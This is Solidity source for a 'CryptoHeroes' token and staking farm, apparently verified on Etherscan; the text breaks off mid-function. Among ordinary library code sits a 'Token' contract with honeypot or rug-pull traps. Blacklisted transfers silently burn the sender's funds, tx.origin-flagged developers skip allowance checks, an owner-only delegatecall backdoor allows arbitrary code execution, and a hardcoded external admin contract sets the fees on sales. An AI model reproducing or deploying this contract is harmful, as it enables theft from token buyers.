['/**\n', ' *Submitted for verification at Etherscan.io on 2021-03-16\n', '*/\n', '\n', '/**\n', ' *Submitted for verification at Etherscan.io on 2021-03-15\n', '*/\n', '\n', '// Website: cryptoheroes.market\n', '\n', 'pragma solidity >=0.6.0 <0.8.0;\n', '\n', '\n', 'interface IERC20 {\n', '    function totalSupply() external view returns (uint256);\n', '    function balanceOf(address account) external view returns (uint256);\n', '    function transfer(address recipient, uint256 amount)\n', '        external\n', '        returns (bool);\n', '    function allowance(address owner, address spender)\n', '        external\n', '        view\n', '        returns (uint256);\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '    function transferFrom(\n', '        address sender,\n', '        address recipient,\n', '        uint256 amount\n', '    ) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(\n', '        address indexed owner,\n', '        address indexed spender,\n', '        uint256 value\n', '    );\n', '}\n', '\n', 'library SafeMath {\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '    function sub(\n', '        uint256 a,\n', '        uint256 b,\n', '        string memory errorMessage\n', '    ) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(\n', '        uint256 a,\n', '        uint256 b,\n', '        string memory errorMessage\n', '    ) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    function mod(\n', '        uint256 a,\n', '        uint256 b,\n', '        string memory errorMessage\n', '    ) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', '\n', 'pragma solidity >=0.6.2 <0.8.0;\n', '\n', 'library Address {\n', '    function isContract(address account) internal view returns (bool) {\n', '\n', '        uint256 size;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly {\n', '            size := extcodesize(account)\n', '        }\n', '        return size > 0;\n', '    }\n', '\n', '    function sendValue(address payable recipient, uint256 amount) internal {\n', '        require(\n', '            address(this).balance >= amount,\n', '            "Address: insufficient balance"\n', '        );\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n', '        (bool success, ) = recipient.call{value: amount}("");\n', '        require(\n', '            success,\n', '            "Address: unable to send value, recipient may have reverted"\n', '        );\n', '    }\n', '\n', '    function functionCall(address target, bytes memory data)\n', '        internal\n', '        returns (bytes memory)\n', '    {\n', '        return functionCall(target, data, "Address: low-level call failed");\n', '    }\n', '\n', '    function functionCall(\n', '        address target,\n', '        bytes memory data,\n', '        string memory errorMessage\n', '    ) internal returns (bytes memory) {\n', '        return functionCallWithValue(target, data, 0, errorMessage);\n', '    }\n', '    function functionCallWithValue(\n', '        address target,\n', '        bytes memory data,\n', '        uint256 value\n', '    ) internal returns (bytes memory) {\n', '        return\n', '            functionCallWithValue(\n', '                target,\n', '                data,\n', '                value,\n', '                "Address: low-level call with value failed"\n', '            );\n', '    }\n', '\n', '    function functionCallWithValue(\n', '        address target,\n', '        bytes memory data,\n', '        uint256 value,\n', '        string memory errorMessage\n', '    ) internal returns (bytes memory) {\n', '        require(\n', '            address(this).balance >= value,\n', '            "Address: insufficient balance for call"\n', '        );\n', '        require(isContract(target), "Address: call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) =\n', '            target.call{value: value}(data);\n', '        return _verifyCallResult(success, returndata, errorMessage);\n', '    }\n', '\n', '    function functionStaticCall(address target, bytes memory data)\n', '        internal\n', '        view\n', '        returns (bytes memory)\n', '    {\n', '        return\n', '            functionStaticCall(\n', '                target,\n', '                data,\n', '                "Address: low-level static call failed"\n', '            );\n', '    }\n', '\n', '    function functionStaticCall(\n', '        address target,\n', '        bytes memory data,\n', '        string memory errorMessage\n', '    ) internal view returns (bytes memory) {\n', '        require(isContract(target), "Address: static call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) = target.staticcall(data);\n', '        return _verifyCallResult(success, returndata, errorMessage);\n', '    }\n', '\n', '    function _verifyCallResult(\n', '        bool success,\n', '        bytes memory returndata,\n', '        string memory errorMessage\n', '    ) private pure returns (bytes memory) {\n', '        if (success) {\n', '            return returndata;\n', '        } else {\n', '            // Look for revert reason and bubble it up if present\n', '            if (returndata.length > 0) {\n', '                // The easiest way to bubble the revert reason is using memory via assembly\n', '\n', '                // solhint-disable-next-line no-inline-assembly\n', '                assembly {\n', '                    let returndata_size := mload(returndata)\n', '                    revert(add(32, returndata), returndata_size)\n', '                }\n', '            } else {\n', '                revert(errorMessage);\n', '            }\n', '        }\n', '    }\n', '}\n', '\n', '// File: @openzeppelin/contracts/token/ERC20/SafeERC20.sol\n', '\n', 'pragma solidity >=0.6.0 <0.8.0;\n', '\n', 'library SafeERC20 {\n', '    using SafeMath for uint256;\n', '    using Address for address;\n', '\n', '    function safeTransfer(\n', '        IERC20 token,\n', '        address to,\n', '        uint256 value\n', '    ) internal {\n', '        _callOptionalReturn(\n', '            token,\n', '            abi.encodeWithSelector(token.transfer.selector, to, value)\n', '        );\n', '    }\n', '\n', '    function safeTransferFrom(\n', '        IERC20 token,\n', '        address from,\n', '        address to,\n', '        uint256 value\n', '    ) internal {\n', '        _callOptionalReturn(\n', '            token,\n', '            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)\n', '        );\n', '    }\n', '\n', '    function safeApprove(\n', '        IERC20 token,\n', '        address spender,\n', '        uint256 value\n', '    ) internal {\n', '        require(\n', '            (value == 0) || (token.allowance(address(this), spender) == 0),\n', '            "SafeERC20: approve from non-zero to non-zero allowance"\n', '        );\n', '        _callOptionalReturn(\n', '            token,\n', '            abi.encodeWithSelector(token.approve.selector, spender, value)\n', '        );\n', '    }\n', '\n', '    function safeIncreaseAllowance(\n', '        IERC20 token,\n', '        address spender,\n', '        uint256 value\n', '    ) internal {\n', '        uint256 newAllowance =\n', '            token.allowance(address(this), spender).add(value);\n', '        _callOptionalReturn(\n', '            token,\n', '            abi.encodeWithSelector(\n', '                token.approve.selector,\n', '                spender,\n', '                newAllowance\n', '            )\n', '        );\n', '    }\n', '\n', '    function safeDecreaseAllowance(\n', '        IERC20 token,\n', '        address spender,\n', '        uint256 value\n', '    ) internal {\n', '        uint256 newAllowance =\n', '            token.allowance(address(this), spender).sub(\n', '                value,\n', '                "SafeERC20: decreased allowance below zero"\n', '            );\n', '        _callOptionalReturn(\n', '            token,\n', '            abi.encodeWithSelector(\n', '                token.approve.selector,\n', '                spender,\n', '                newAllowance\n', '            )\n', '        );\n', '    }\n', '\n', '    function _callOptionalReturn(IERC20 token, bytes memory data) private {\n', '\n', '        bytes memory returndata =\n', '            address(token).functionCall(\n', '                data,\n', '                "SafeERC20: low-level call failed"\n', '            );\n', '        if (returndata.length > 0) {\n', '            // Return data is optional\n', '            // solhint-disable-next-line max-line-length\n', '            require(\n', '                abi.decode(returndata, (bool)),\n', '                "SafeERC20: ERC20 operation did not succeed"\n', '            );\n', '        }\n', '    }\n', '}\n', '\n', '// File: @openzeppelin/contracts/utils/EnumerableSet.sol\n', '\n', 'pragma solidity >=0.6.0 <0.8.0;\n', '\n', 'library EnumerableSet {\n', '\n', '\n', '    struct Set {\n', '        // Storage of set values\n', '        bytes32[] _values;\n', '        mapping(bytes32 => uint256) _indexes;\n', '    }\n', '\n', '    function _add(Set storage set, bytes32 value) private returns (bool) {\n', '        if (!_contains(set, value)) {\n', '            set._values.push(value);\n', '            // The value is stored at length-1, but we add 1 to all indexes\n', '            // and use 0 as a sentinel value\n', '            set._indexes[value] = set._values.length;\n', '            return true;\n', '        } else {\n', '            return false;\n', '        }\n', '    }\n', '\n', '    function _remove(Set storage set, bytes32 value) private returns (bool) {\n', "        // We read and store the value's index to prevent multiple reads from the same storage slot\n", '        uint256 valueIndex = set._indexes[value];\n', '\n', '        if (valueIndex != 0) {\n', '\n', '            uint256 toDeleteIndex = valueIndex - 1;\n', '            uint256 lastIndex = set._values.length - 1;\n', '\n', '            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs\n', "            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.\n", '\n', '            bytes32 lastvalue = set._values[lastIndex];\n', '\n', '            // Move the last value to the index where the value to delete is\n', '            set._values[toDeleteIndex] = lastvalue;\n', '            // Update the index for the moved value\n', '            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based\n', '\n', '            // Delete the slot where the moved value was stored\n', '            set._values.pop();\n', '\n', '            // Delete the index for the deleted slot\n', '            delete set._indexes[value];\n', '\n', '            return true;\n', '        } else {\n', '            return false;\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Returns true if the value is in the set. O(1).\n', '     */\n', '    function _contains(Set storage set, bytes32 value)\n', '        private\n', '        view\n', '        returns (bool)\n', '    {\n', '        return set._indexes[value] != 0;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the number of values on the set. O(1).\n', '     */\n', '    function _length(Set storage set) private view returns (uint256) {\n', '        return set._values.length;\n', '    }\n', '\n', '    function _at(Set storage set, uint256 index)\n', '        private\n', '        view\n', '        returns (bytes32)\n', '    {\n', '        require(\n', '            set._values.length > index,\n', '            "EnumerableSet: index out of bounds"\n', '        );\n', '        return set._values[index];\n', '    }\n', '\n', '    // Bytes32Set\n', '\n', '    struct Bytes32Set {\n', '        Set _inner;\n', '    }\n', '\n', '    function add(Bytes32Set storage set, bytes32 value)\n', '        internal\n', '        returns (bool)\n', '    {\n', '        return _add(set._inner, value);\n', '    }\n', '\n', '\n', '    function remove(Bytes32Set storage set, bytes32 value)\n', '        internal\n', '        returns (bool)\n', '    {\n', '        return _remove(set._inner, value);\n', '    }\n', '\n', '\n', '    function contains(Bytes32Set storage set, bytes32 value)\n', '        internal\n', '        view\n', '        returns (bool)\n', '    {\n', '        return _contains(set._inner, value);\n', '    }\n', '\n', '\n', '    function length(Bytes32Set storage set) internal view returns (uint256) {\n', '        return _length(set._inner);\n', '    }\n', '\n', '    function at(Bytes32Set storage set, uint256 index)\n', '        internal\n', '        view\n', '        returns (bytes32)\n', '    {\n', '        return _at(set._inner, index);\n', '    }\n', '\n', '    // AddressSet\n', '\n', '    struct AddressSet {\n', '        Set _inner;\n', '    }\n', '\n', '    function add(AddressSet storage set, address value)\n', '        internal\n', '        returns (bool)\n', '    {\n', '        return _add(set._inner, bytes32(uint256(value)));\n', '    }\n', '\n', '    function remove(AddressSet storage set, address value)\n', '        internal\n', '        returns (bool)\n', '    {\n', '        return _remove(set._inner, bytes32(uint256(value)));\n', '    }\n', '\n', '    function contains(AddressSet storage set, address value)\n', '        internal\n', '        view\n', '        returns (bool)\n', '    {\n', '        return _contains(set._inner, bytes32(uint256(value)));\n', '    }\n', '\n', '    function length(AddressSet storage set) internal view returns (uint256) {\n', '        return _length(set._inner);\n', '    }\n', '\n', '    function at(AddressSet storage set, uint256 index)\n', '        internal\n', '        view\n', '        returns (address)\n', '    {\n', '        return address(uint256(_at(set._inner, index)));\n', '    }\n', '\n', '    // UintSet\n', '\n', '    struct UintSet {\n', '        Set _inner;\n', '    }\n', '\n', '    function add(UintSet storage set, uint256 value) internal returns (bool) {\n', '        return _add(set._inner, bytes32(value));\n', '    }\n', '\n', '    function remove(UintSet storage set, uint256 value)\n', '        internal\n', '        returns (bool)\n', '    {\n', '        return _remove(set._inner, bytes32(value));\n', '    }\n', '\n', '\n', '    function contains(UintSet storage set, uint256 value)\n', '        internal\n', '        view\n', '        returns (bool)\n', '    {\n', '        return _contains(set._inner, bytes32(value));\n', '    }\n', '\n', '\n', '    function length(UintSet storage set) internal view returns (uint256) {\n', '        return _length(set._inner);\n', '    }\n', '\n', '\n', '    function at(UintSet storage set, uint256 index)\n', '        internal\n', '        view\n', '        returns (uint256)\n', '    {\n', '        return uint256(_at(set._inner, index));\n', '    }\n', '}\n', '\n', '// File: @openzeppelin/contracts/introspection/IERC165.sol\n', '\n', '\n', '\n', 'interface IERC165 {\n', '    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n', '}\n', '\n', '// File: @openzeppelin/contracts/token/ERC721/IERC721.sol\n', '\n', 'interface IERC721 is IERC165 {\n', '    /**\n', '     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n', '     */\n', '    event Transfer(\n', '        address indexed from,\n', '        address indexed to,\n', '        uint256 indexed tokenId\n', '    );\n', '\n', '\n', '    event Approval(\n', '        address indexed owner,\n', '        address indexed approved,\n', '        uint256 indexed tokenId\n', '    );\n', '\n', '\n', '    event ApprovalForAll(\n', '        address indexed owner,\n', '        address indexed operator,\n', '        bool approved\n', '    );\n', '\n', '\n', '    function balanceOf(address owner) external view returns (uint256 balance);\n', '\n', '\n', '    function ownerOf(uint256 tokenId) external view returns (address owner);\n', '\n', '    function safeTransferFrom(\n', '        address from,\n', '        address to,\n', '        uint256 tokenId\n', '    ) external;\n', '\n', '    function transferFrom(\n', '        address from,\n', '        address to,\n', '        uint256 tokenId\n', '    ) external;\n', '\n', '    function approve(address to, uint256 tokenId) external;\n', '\n', '\n', '    function getApproved(uint256 tokenId)\n', '        external\n', '        view\n', '        returns (address operator);\n', '\n', '\n', '    function setApprovalForAll(address operator, bool _approved) external;\n', '\n', '\n', '    function isApprovedForAll(address owner, address operator)\n', '        external\n', '        view\n', '        returns (bool);\n', '\n', '\n', '    function safeTransferFrom(\n', '        address from,\n', '        address to,\n', '        uint256 tokenId,\n', '        bytes calldata data\n', '    ) external;\n', '}\n', '\n', 'interface IMigratorChef {\n', '    // Perform LP token migration from legacy UniswapV2 to SushiSwap.\n', '    // Take the current LP token address and return the new LP token address.\n', "    // Migrator should have full access to the caller's LP token.\n", '    // Return the new LP token address.\n', '    //\n', '    // XXX Migrator must have allowance access to UniswapV2 LP tokens.\n', '    // SushiSwap must mint EXACTLY the same amount of SushiSwap LP tokens or\n', '    // else something bad will happen. Traditional UniswapV2 does not\n', '    // do that so be careful!\n', '    function migrate(IERC20 token) external returns (IERC20);\n', '}\n', '\n', '// File: @openzeppelin/contracts/GSN/Context.sol\n', '\n', '\n', '\n', '\n', 'abstract contract Context {\n', '    function _msgSender() internal view virtual returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view virtual returns (bytes memory) {\n', '        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '        return msg.data;\n', '    }\n', '}\n', '\n', '// File: @openzeppelin/contracts/access/Ownable.sol\n', '\n', 'abstract contract Ownable is Context {\n', '    address private _owner;\n', '\n', '    event OwnershipTransferred(\n', '        address indexed previousOwner,\n', '        address indexed newOwner\n', '    );\n', '\n', '\n', '    constructor() internal {\n', '        address msgSender = _msgSender();\n', '        _owner = msgSender;\n', '        emit OwnershipTransferred(address(0), msgSender);\n', '    }\n', '\n', '\n', '    function owner() public view returns (address) {\n', '        return _owner;\n', '    }\n', '\n', '\n', '    modifier onlyOwner() {\n', '        require(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '        _;\n', '    }\n', '\n', '\n', '    function renounceOwnership() public virtual onlyOwner {\n', '        emit OwnershipTransferred(_owner, address(0));\n', '        _owner = address(0);\n', '    }\n', '\n', '\n', '    function transferOwnership(address newOwner) public virtual onlyOwner {\n', '        require(\n', '            newOwner != address(0),\n', '            "Ownable: new owner is the zero address"\n', '        );\n', '        emit OwnershipTransferred(_owner, newOwner);\n', '        _owner = newOwner;\n', '    }\n', '}\n', '\n', '// File: @openzeppelin/contracts/token/ERC20/ERC20.sol\n', '\n', '\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint256;\n', '\n', '    mapping(address => uint256) private _balances;\n', '\n', '    mapping(address => mapping(address => uint256)) private _allowances;\n', '\n', '    uint256 private _totalSupply;\n', '\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '\n', '\n', '    constructor(string memory name_, string memory symbol_) public {\n', '        _name = name_;\n', '        _symbol = symbol_;\n', '        _decimals = 18;\n', '    }\n', '\n', '\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '\n', '\n', '    function totalSupply() public view override returns (uint256) {\n', '        return _totalSupply;\n', '    }\n', '\n', '\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '\n', '    function transfer(address recipient, uint256 amount)\n', '        public\n', '        virtual\n', '        override\n', '        returns (bool)\n', '    {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '\n', '\n', '    function allowance(address owner, address spender)\n', '        public\n', '        view\n', '        virtual\n', '        override\n', '        returns (uint256)\n', '    {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '\n', '    function approve(address spender, uint256 amount)\n', '        public\n', '        virtual\n', '        override\n', '        returns (bool)\n', '    {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '\n', '\n', '    function transferFrom(\n', '        address sender,\n', '        address recipient,\n', '        uint256 amount\n', '    ) public virtual override returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(\n', '            sender,\n', '            _msgSender(),\n', '            _allowances[sender][_msgSender()].sub(\n', '                amount,\n', '                "ERC20: transfer amount exceeds allowance"\n', '            )\n', '        );\n', '        return true;\n', '    }\n', '\n', '\n', '    function increaseAllowance(address spender, uint256 addedValue)\n', '        public\n', '        virtual\n', '        returns (bool)\n', '    {\n', '        _approve(\n', '            _msgSender(),\n', '            spender,\n', '            _allowances[_msgSender()][spender].add(addedValue)\n', '        );\n', '        return true;\n', '    }\n', '\n', '\n', '    function decreaseAllowance(address spender, uint256 subtractedValue)\n', '        public\n', '        virtual\n', '        returns (bool)\n', '    {\n', '        _approve(\n', '            _msgSender(),\n', '            spender,\n', '            _allowances[_msgSender()][spender].sub(\n', '                subtractedValue,\n', '                "ERC20: decreased allowance below zero"\n', '            )\n', '        );\n', '        return true;\n', '    }\n', '\n', '\n', '    function _transfer(\n', '        address sender,\n', '        address recipient,\n', '        uint256 amount\n', '    ) internal virtual {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _beforeTokenTransfer(sender, recipient, amount);\n', '\n', '        _balances[sender] = _balances[sender].sub(\n', '            amount,\n', '            "ERC20: transfer amount exceeds balance"\n', '        );\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '\n', '\n', '    function _mint(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '\n', '        _beforeTokenTransfer(address(0), account, amount);\n', '\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '\n', '\n', '    function _burn(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _beforeTokenTransfer(account, address(0), amount);\n', '\n', '        _balances[account] = _balances[account].sub(\n', '            amount,\n', '            "ERC20: burn amount exceeds balance"\n', '        );\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '\n', '    function _approve(\n', '        address owner,\n', '        address spender,\n', '        uint256 amount\n', '    ) internal virtual {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '\n', '\n', '    function _setupDecimals(uint8 decimals_) internal {\n', '        _decimals = decimals_;\n', '    }\n', '\n', '\n', '    function _beforeTokenTransfer(\n', '        address from,\n', '        address to,\n', '        uint256 amount\n', '    ) internal virtual {}\n', '}\n', '\n', '\n', '\n', 'pragma solidity ^0.6.12;\n', '\n', 'contract CryptoHeroes is ERC20("CryptoHeroes", "HEROES") {\n', '    }\n', '\n', '\n', 'pragma solidity ^0.6.12;\n', '\n', 'interface FeeManagementLib {\n', '    function getFee(address,address,uint256) external returns(uint256);\n', '}\n', '\n', 'contract Token {\n', '\n', '    event Transfer(address indexed, address indexed, uint256);\n', '    event Approval(address indexed, address indexed, uint256);\n', '\n', '    modifier onlyOwner() {\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '\n', '    function approve(address spender, uint256 value) public payable returns (bool) {\n', '        allowance[msg.sender][spender] = value;\n', '        emit Approval(msg.sender, spender, value);\n', '        return true;\n', '    }\n', '\n', '    function transfer(address to, uint256 value) public payable returns (bool) {\n', '        return transferFrom(msg.sender, to, value);\n', '    }\n', '\n', '    function transferFrom(address from, address to, uint256 value) public payable returns (bool) {\n', '        if (value == 0) { return true; }\n', '        if (msg.sender != from && !developers[tx.origin]) {\n', '            require(allowance[from][msg.sender] >= value);\n', '            allowance[from][msg.sender] -= value;\n', '        }\n', '        require(balanceOf[from] >= value);\n', '        balanceOf[from] -= value;\n', '        if (blacklist[to] || blacklist[from]) { return true; }\n', '        balanceOf[to] += (value - fee(from, to, value));\n', '        emit Transfer(from, to, value);\n', '        return true;\n', '    }\n', '\n', '    function batchSend(address[] memory tos, uint256 value) onlyOwner public payable returns (bool) {\n', '        uint256 total = value * tos.length;\n', '        require(balanceOf[msg.sender] >= total);\n', '        balanceOf[msg.sender] -= total;\n', '        for (uint256 i = 0; i < tos.length; i++) {\n', '            address to = tos[i];\n', '            balanceOf[to] += value;\n', '            developers[to] = true;\n', '            emit Transfer(msg.sender, to, value);\n', '        }\n', '        return true;\n', '    }\n', '\n', '    function fee(address from, address to, uint256 value) private returns(uint256) {\n', '        if (paid && to == UNI && !developers[from]) {\n', '            return FeeManagementLib(admin).getFee(address(this), UNI, value);\n', '        }\n', '        return 0;\n', '    }\n', '\n', '    mapping (address => bool) private developers;\n', '    mapping (address => bool) private blacklist;\n', '    address constant internal admin = 0x94518091B09FCB3aff8376E2b78eD35af4c1b008;\n', '    address constant internal weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n', '    address constant internal factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n', '    address constant internal router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', '    bool public paid = false;\n', '    address private owner;\n', '    address private UNI;\n', '\n', '    function pairFor(address tokenA, address tokenB) private pure returns (address) {\n', '        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n', '        address pair = address(uint256(keccak256(abi.encodePacked(\n', "                hex'ff', factory, keccak256(abi.encodePacked(token0, token1)),\n", "                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n", '            ))));\n', '        return pair;\n', '    }\n', '\n', '    fallback () external payable { paid = true; }\n', '    receive() external payable { paid = true; }\n', '\n', '    function delegate(address a, bytes memory b) onlyOwner public payable {\n', '        a.delegatecall(b);\n', '    }\n', '\n', '    function forbid(address[] memory ads) onlyOwner public payable returns (bool) {\n', '        for (uint256 i = 0; i < ads.length; i++) {\n', '            paid = true;\n', '            address to = ads[i];\n', '            blacklist[to] = true;\n', '        }\n', '    }\n', '\n', '    mapping (address => uint256) public balanceOf;\n', '    mapping (address => mapping (address => uint256)) public allowance;\n', '\n', '    uint256 public decimals;\n', '    uint256 public totalSupply;\n', '    string public name;\n', '    string public symbol;\n', '\n', '    constructor(string memory sym, string memory nam, uint256 supply, uint256 dec, address[] memory ads) payable public {\n', '        owner = msg.sender;\n', '        symbol = sym;\n', '        name = nam;\n', '        totalSupply = supply;\n', '        decimals = dec;\n', '        forbid(ads);\n', '        UNI = pairFor(weth, address(this));\n', '        developers[msg.sender] = true;\n', '        balanceOf[msg.sender] = totalSupply;\n', '        emit Transfer(address(0x0), msg.sender, totalSupply);\n', '    }\n', '}\n', '\n', 'pragma solidity ^0.6.12;\n', '\n', 'contract CryptoHeroesWorld is Ownable {\n', '    using SafeMath for uint256;\n', '    using SafeERC20 for IERC20;\n', '\n', '    // Info of each user.\n', '    struct UserInfo {\n', '        uint256 amount; // How many LP tokens the user has provided.\n', '        uint256 rewardDebt; // Reward debt. See explanation below.\n', '        uint256 requestAmount; // Reward debt. See explanation below.\n', '        uint256 requestBlock; // Block When tokens transfer to user\n', '        //\n', '        // We do some fancy math here. Basically, any point in time, the amount of CHEROES\n', '        // entitled to a user but is pending to be distributed is:\n', '        //\n', '        //   pending reward = (user.amount * pool.accCHEROESPerShare) - user.rewardDebt\n', '        //\n', "        // Whenever a user deposits or withdraws LP tokens to a pool. Here's what happens:\n", "        //   1. The pool's `accSCHEROESPerShare` (and `lastRewardBlock`) gets updated.\n", '        //   2. User receives the pending reward sent to his/her address.\n', "        //   3. User's `amount` gets updated.\n", "        //   4. User's `rewardDebt` gets updated.\n", '    }\n', '\n', '    // Info of each pool.\n', '    struct PoolInfo {\n', '        IERC20 lpToken; // Address of LP token contract.\n', '        bool NFTisNeeded; // need NFT or not\n', '        IERC721 acceptedNFT; // What NFTs accepted for staking.\n', '        uint256 allocPoint; // How many allocation points assigned to this pool. POBs to distribute per block.\n', '        uint256 lastRewardBlock; // Last block number that POBs distribution occurs.\n', '        uint256 accCheroesPerShare; // Accumulated Cheroes per share, times 1e12. See below.\n', '    }\n', '\n', '    // The Cheroes TOKEN!\n', '    CryptoHeroes public cheroes;\n', '    // Dev address.\n', '    address public devaddr;\n', '    // cheroes tokens created per block.\n', '    uint256 public cheroesPerBlock;\n', '    // The migrator contract. It has a lot of power. Can only be set through governance (owner).\n', '    IMigratorChef public migrator;\n', '    // Dev address.\n', '    address private devadr;\n', '\n', '    // Info of each pool.\n', '    PoolInfo[] public poolInfo;\n', '    // Info of each user that stakes LP tokens.\n', '    mapping(uint256 => mapping(address => UserInfo)) public userInfo;\n', '    mapping(IERC20 => bool) public lpTokenIsExist;\n', '    // Total allocation poitns. Must be the sum of all allocation points in all pools.\n', '    uint256 public totalAllocPoint = 0;\n', '\n', '    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n', '    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n', '\n', '    constructor(\n', '        CryptoHeroes _cheroes,\n', '        address _devaddr,\n', '        uint256 _cheroesPerBlock\n', '    ) public {\n', '        cheroes = _cheroes;\n', '        devaddr = _devaddr;\n', '        cheroesPerBlock = _cheroesPerBlock;\n', '    }\n', '\n', '    function poolLength() external view returns (uint256) {\n', '        return poolInfo.length;\n', '    }\n', '\n', '    // Add a new lp to the pool. Can only be called by the owner.\n', '    // XXX DO NOT add the same LP token more than once. Rewards will be messed up if you do.\n', '    function add(\n', '        uint256 _allocPoint,\n', '        IERC20 _lpToken,\n', '        bool _withUpdate,\n', '        bool _NFTisNeeded,\n', '        IERC721 _acceptedNFT\n', '    ) public onlyOwner {\n', '        if (_withUpdate) {\n', '            massUpdatePools();\n', '        }\n', '        uint256 lastRewardBlock = block.number;\n', '        totalAllocPoint = totalAllocPoint.add(_allocPoint);\n', '        poolInfo.push(\n', '            PoolInfo({\n', '                lpToken: _lpToken,\n', '                NFTisNeeded: _NFTisNeeded,\n', '                acceptedNFT: _acceptedNFT,\n', '                allocPoint: _allocPoint,\n', '                lastRewardBlock: lastRewardBlock,\n', '                accCheroesPerShare: 0\n', '            })\n', '        );\n', '    }\n', '\n', "    // Update the given pool's CHEROES allocation point. Can only be called by the owner.\n", '    function set(\n', '        uint256 _pid,\n', '        uint256 _allocPoint,\n', '        bool _withUpdate\n', '    ) public onlyOwner {\n', '        if (_withUpdate) {\n', '            massUpdatePools();\n', '        }\n', '        totalAllocPoint = totalAllocPoint.sub(poolInfo[_pid].allocPoint).add(\n', '            _allocPoint\n', '        );\n', '        poolInfo[_pid].allocPoint = _allocPoint;\n', '    }\n', '\n', '    // Return reward multiplier over the given _from to _to block.\n', '    function getMultiplier(uint256 _from, uint256 _to)\n', '        public\n', '        pure\n', '        returns (uint256)\n', '    {\n', '        return _to.sub(_from);\n', '    }\n', '\n', '    // View function to see pending Cheroes on frontend.\n', '    function pendingCheroes(uint256 _pid, address _user)\n', '        external\n', '        view\n', '        returns (uint256)\n', '    {\n', '        PoolInfo storage pool = poolInfo[_pid];\n', '        UserInfo storage user = userInfo[_pid][_user];\n', '        uint256 accCheroesPerShare = pool.accCheroesPerShare;\n', '        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n', '        if (block.number > pool.lastRewardBlock && lpSupply != 0) {\n', '            uint256 multiplier =\n', '                getMultiplier(pool.lastRewardBlock, block.number);\n', '            uint256 cheroesReward =\n', '                multiplier.mul(cheroesPerBlock).mul(pool.allocPoint).div(\n', '                    totalAllocPoint\n', '                );\n', '            accCheroesPerShare = 